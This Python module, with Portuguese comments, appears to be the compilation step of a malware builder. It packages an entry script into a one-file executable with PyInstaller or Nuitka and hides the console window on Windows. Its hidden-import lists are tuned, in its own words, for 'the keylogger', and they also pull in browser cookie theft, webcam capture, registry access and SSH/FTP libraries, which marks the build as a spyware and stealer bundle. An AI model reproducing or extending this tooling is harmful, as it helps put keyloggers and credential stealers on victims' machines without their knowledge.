# strategies/compilation.py

import os
import sys
import platform
import subprocess
import cv2
from .base import BuildContext, CompilationStrategy

class PyInstallerCompilation(CompilationStrategy):
    def execute(self, context: BuildContext) -> BuildContext:
        command = ['pyinstaller', '--clean', '--onefile', 
                   f'--distpath={context.build_dir / "dist"}', 
                   f'--workpath={context.build_dir / "build"}', 
                   f'--name={context.config["output"]}']
        
        if context.config['platform'] == 'windows':
            command.append('--noconsole')
        
        # --- CORREÇÃO PARA O KEYLOGGER E OUTROS MÓDULOS ---
        # Definimos os hidden-imports que o PyInstaller costuma ignorar
        hidden_imports = [
            'requests', 'psutil', 'cv2', 'pynput', 
            'pynput.keyboard._win32', 'pynput.mouse._win32', # Crítico para o Keylogger
            'browser_cookie3', 'Cryptodome', 'PIL', 'numpy', 
            'win32', 'sqlite3', 'paramiko', 'ftplib', 'threading', 'six'
        ]
        
        for module in hidden_imports:
            command.append(f'--hidden-import={module}')

        # Garante que o numpy seja coletado inteiramente (evita erros de DLL)
        command.extend(['--collect-all', 'numpy'])

        try:
            cv2_path = os.path.dirname(cv2.__file__)
            separator = os.pathsep
            command.append(f'--add-binary={cv2_path}{separator}cv2')
        except ImportError:
            # Se não encontrar cv2, loga o erro mas tenta prosseguir
            print("[AVISO] OpenCV não encontrado no ambiente do compilador.")

        # Adiciona argumentos extras definidos pelo usuário no Builder.py
        extra_args = context.config.get('extra_args', [])
        command.extend(extra_args)

        command.append(str(context.entry_script_path))
        
        # Execução com captura de logs para facilitar o seu debug
        result = subprocess.run(command, capture_output=True, text=True, encoding='utf-8')
        if result.returncode != 0:
            raise RuntimeError(f"PyInstaller falhou:\n{result.stderr}")
            
        context.final_artifact_path = context.build_dir / "dist" / context.config["output"]
        return context
    


class NuitkaCompilation(CompilationStrategy):
    """
    Estratégia de compilação usando Nuitka, com feedback em tempo real e sintaxe compatível.
    """
    def execute(self, context: BuildContext) -> BuildContext:
        command = [
            sys.executable, '-m', 'nuitka', 
            '--onefile',
            '--remove-output',
            '--show-progress',
            f'--output-dir={context.build_dir / "dist"}',
            f'--output-filename={context.config["output"]}'
        ]
        
        if context.config['platform'] == 'windows':
            command.append('--windows-disable-console')
        
        # --- INÍCIO DA CORREÇÃO ---
        # Usando a opção '--include-module', que é mais compatível com versões antigas do Nuitka,
        # em vez de '--follow-imports-to'.
        modules_to_include = [
            'requests', 'psutil', 'cv2', 'pynput', 'browser_cookie3', 
            'Cryptodome', 'PIL', 'numpy', 'win32', 'win32gui',  'sqlite3', 'http.server',
            'winreg', 'threading'
        ]
        for module in modules_to_include:
            command.append(f'--include-module={module}' )
        # --- FIM DA CORREÇÃO ---

        extra_args = context.config.get('extra_args', [])
        command.extend(extra_args)

        command.append(str(context.entry_script_path))

        # A lógica de feedback em tempo real com Popen permanece a mesma
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8')
            
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
            
            return_code = process.poll()
            if return_code != 0:
                raise RuntimeError(f"Nuitka falhou com o código de retorno: {return_code}")

        except Exception as e:
             raise RuntimeError(f"Falha ao executar o Nuitka: {e}")
            
        context.final_artifact_path = context.build_dir / "dist" / context.config["output"]
        return context



class ScriptOutput(CompilationStrategy):
    def execute(self, context: BuildContext) -> BuildContext:
        # Para um script, o "artefato final" é apenas o script de entrada atual
        context.final_artifact_path = context.entry_script_path
        return context
